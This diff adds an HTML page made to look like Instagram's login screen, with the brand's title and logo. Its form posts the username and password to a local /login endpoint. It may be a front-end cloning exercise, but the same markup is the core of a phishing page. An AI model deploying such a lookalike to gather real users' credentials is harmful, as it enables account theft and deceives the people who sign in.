@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <link rel="stylesheet" href="./styles.css" />
+</head>
+<body>
+  <main class="flex align-items-center justify-content-center">
+    <section id="auth" class="flex direction-column">
+      <div class="panel login flex direction-column">
+        <h1 title="Instagram" class="flex justify-content-center">
+          <!-- ✅ LOCAL IMAGE – img/instagram-logo.png -->
+          <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+        </h1>
+        <form action="/login" method="POST">
+          <input name="username" placeholder="Phone number, username, or email" required />
+          <input name="password" type="password" placeholder="Password" required />
+          <button type="submit">Log In</button>
+        </form>
+        <div class="flex separator align-items-center">
+          <span></span>
+          <div class="or">OR</div>
+          <span></span>
+        </div>
+        <div class="login-with-fb flex direction-column align-items-center">
+          <div><img /><a>Log in with Facebook</a></div>
+          <a href="#">Forgot password?</a>
+        </div>
+      </div>
+      <div class="panel register flex justify-content-center">
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+      </div>
+    </section>
+  </main>
+</body>
+</html>
